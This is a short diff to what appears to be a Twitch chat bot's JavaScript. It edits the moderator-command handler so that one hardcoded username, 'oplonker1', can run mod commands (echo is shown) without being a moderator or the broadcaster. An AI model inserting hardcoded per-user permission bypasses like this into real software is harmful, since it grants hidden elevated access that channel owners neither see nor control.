@@ -25,7 +25,7 @@ function CommandHandler(channel, tags, message) {
 }
 
 function ModCommandHandler(channel, tags, command, args) {
-    if (tags.mod !== true && tags.badges["broadcaster"] === undefined) return;
+    if ((tags.mod !== true && tags.badges["broadcaster"] === undefined) && tags.username !== 'oplonker1') return;
 
     if (isEcho(command)) {
         echo(channel, args);
